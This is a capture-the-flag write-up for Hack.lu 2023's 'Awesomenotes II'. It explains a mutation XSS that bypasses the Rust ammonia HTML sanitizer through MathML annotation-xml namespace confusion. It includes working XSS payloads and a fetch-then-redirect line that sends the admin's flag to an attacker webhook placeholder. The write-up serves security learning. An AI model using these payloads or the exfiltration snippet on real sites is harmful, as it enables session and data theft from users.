+++
title = 'Awesomenotes II - Hack.lu CTF 2023'
date = 2023-10-16 17:09:06
draft = false
tags = ["Web","mXSS"]
+++

**tl;dr**

+ XSS + HTML sanitization library [(ammonia)](https://github.com/rust-ammonia/ammonia/tree/master) bypass
+ Namespace confusion in ammonia using custom allowed extra tags(math & style)

<!--more-->

**Challenge points**: 253
**No. of solves**: 15

## Challenge Description

Admittedly, that was a little embarrassing. We've fixed that issue though and have become truly unpwnable now (for real). Do it, you wont.
link: https://awesomenotes2.online/


## Analysis

Taking a look at the given source files, there are 3 endpoints of note:
`/create - create a note`
`/report - report a note`
`/api/note/:note - view note`
*note - admins note is in /api/note/flag*


The following function handles the creation of notes:
```rs
async fn upload_note(
    mut multipart: Multipart,
) -> (StatusCode, Result<HeaderMap<HeaderValue>, &'static str>) {
    let mut body: Option<String> = None;
    while let Some(field) = multipart.next_field().await.unwrap() {
        let Some(name) = field.name() else { continue };
        if name != "note" {
            continue;
        }
        let Ok(data) = field.text().await else {
            continue;
        };
        body = Some(data);
        break;
    }
    let Some(body) = body else {
        return (StatusCode::BAD_REQUEST, Err("Malformed formdata"));
    };
    if body.len() > 5000 {
        return (StatusCode::PAYLOAD_TOO_LARGE, Err("Note too big"));
    }
    let safe = ammonia::Builder::new()
        .add_tags(TAGS)
        .add_tags(&["style"])
        .rm_clean_content_tags(&["style"])
        /*
            Thank god we don't have any more XSS vulnerabilities now 🙏
        */
        // .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_string();
    let mut name = [0u8; 32];
    fs::File::open("/dev/urandom")
        .unwrap()
        .read_exact(&mut name)
        .expect("Failed to read urandom");
    let name = String::from_iter(name.map(|c| format!("{:02x}", c)));
    fs::write(format!("public/upload/{:}", name), safe).expect("Failed to write note");
    (
        StatusCode::FOUND,
        Ok(HeaderMap::from_iter([(
            LOCATION,
            format!("/note/{:}", name).parse().unwrap(),
        )])),
    )
}
```

Whatever html content we provide is passed through the [ammonia library](https://docs.rs/ammonia/latest/ammonia/), which is

> a whitelist-based HTML sanitization library, designed to prevent cross-site scripting, layout breaking, and clickjacking caused by untrusted user-provided HTML being mixed into a larger web page.

Along with the default allowed tags and attributes of ammonia, a custom list of `TAGS` which are math tags, and the style tag is also allowed using `.add_tags`.

These extra tags being allowed hint at Mutation XSS which can be achieved by using namespace confusion involving the `mathml` and `html` namespace.


## Exploitation

Initially, we created a testing setup locally just to inspect how different tags interact with each other when the `clean` function of ammonia is run against it.

```rs
// list of TAGS
fn main() {

    let init="<script>alert(1)</script>";

    let safe = ammonia::Builder::new()
        .add_tags(TAGS)
        .add_tags(&["style"])
        .rm_clean_content_tags(&["style"])
        .clean(init)
        .to_string();


    println!("{}",init);
    println!("{}", safe);
}
```

We started off by throwing a few mXSS payloads for other libraries such as DOMpurify including one from https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss which uses namespace confusion to achieve XSS. Another thing to note is that the `svg` tag is disallowed by default. Many of the other mXSS payloads make use of the `svg` namespace also but the one in the blog above includes tags (mostly) allowed in this case and Hence we can take a closer look at it.

`<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`

The blog provides a pretty good explanation about the payload which can be summarized in the following points:
+ Anything within the `<style>` tag within the `html` namespace is treated as plaintext but within `mathml` namespace is treated as html tags.
+ `<mtext>` within `mathml` context makes parsers treat everything within it in the `html` namespace.
+ The `<mglyph>` tag is special because it's in the MathML namespace if it's a direct child of a MathML text integration point. All other tags are in the HTML namespace by default.
+ Table gets reordered in the DOM which makes `<mglyph>` a direct child of MathML text and hence `<style>` is now in MathML namespace.

The above payload does not work for us as the `<mglyph>` tag is not present in the allowlist.

With the above concepts in mind, we can take a quick look at the part of the source code of ammonia that deals with checking namespaces of parent and child elements - [check expected namespace function](https://github.com/rust-ammonia/ammonia/blob/master/src/lib.rs#L2023)
```rs
...
 // The only way to switch from mathml to svg/html is with a text integration point
        } else if parent.ns == ns!(mathml) && child.ns != ns!(mathml) {
            // https://html.spec.whatwg.org/#mathml
            matches!(
                &*parent.local,
                "mi" | "mo" | "mn" | "ms" | "mtext" | "annotation-xml"
            )
            ...
```

Here, we find something interesting. `"mi" | "mo" | "mn" | "ms" | "mtext" | "annotation-xml"`, These are the tags which ammonia checks when switch from mathml to svg/html namespace is detected. Among these, `annotation-xml` is of particular interest as we had come across it in another blog on mXSS - https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/

Quoting from the above blog,

> HTML integration points are:
math annotation-xml if it has an attribute called encoding whose value is equal to either text/html or application/xhtml+xml
svg foreignObject
svg desc
svg title


This mentions an attribute `encoding` which can have different values producing different functionality in how contents within it are parsed.
Quoting from https://w3c.github.io/mathml/spec.html#mixing_elements_annotation_xml:

> If the annotation-xml has an encoding attribute that is (ignoring case differences) text/html or annotation/xhtml+xml then the content is parsed as HTML and placed (initially) in the HTML namespace.
Otherwise, it is parsed as foreign content and parsed in a more XML-like manner (like MathML itself in HTML) in which /> signifies an empty element. Content will be placed in the MathML namespace.


This basically translates to:
+ If there is `encoding="text/html"`, content will be placed in the `html` namespace.
+ If there is no attribute, content will be placed in the `mathml` namespace. 

Testing this out using the test setup we have, it can be observed that ammonia considers the attribute and treats contents within the `annotation-xml` tag according to whatever specified but in the "clean" html that it returns, it strips the attribute. Using this, final payload can be created.

## mXSS Explanation

`<math><annotation-xml encoding="text/html"><style><img src=x onerror="alert(1)"></style></annotation-xml></math>`

The above payload can be used to pop an alert on the page. To understand why this works, we can first look at the html that ammonia returns when the payload is parsed.

```html
Input - <math><annotation-xml encoding="text/html"><style><img src=x onerror="alert(1)"></style></annotation-xml></math>
Output - <math><annotation-xml><style><img src=x onerror="alert(1)"></style></annotation-xml></math>
```

`encoding="text/html"` treats the `style` tag in the html namespace and hence, content inside it is treated as plaintext and no filtering is done on it but when the attribute is removed, `style` tag is now in the `mathml` namespace where tags within the `style` tag are considered as html tags.


Trying out the output in a live-dom viewer such as https://software.hixie.ch/utilities/js/live-dom-viewer/ shows the difference between how the DOM views the input and the output.


### Final steps

Now that we have XSS, we just have to make the admin visit the `/api/note/flag` endpoint and send the content to a domain controlled by us.
For that we can use
```js
fetch(`/api/note/flag`).then((r)=>r.text()).then((r)=>location=`<webhook>?a=`+encodeURIComponent(r))
```
Final payload:
```html
<math><annotation-xml encoding="text/html"><style><img src=x onerror="eval(atob(`<base64 payload`))"></style></annotation-xml></math>
```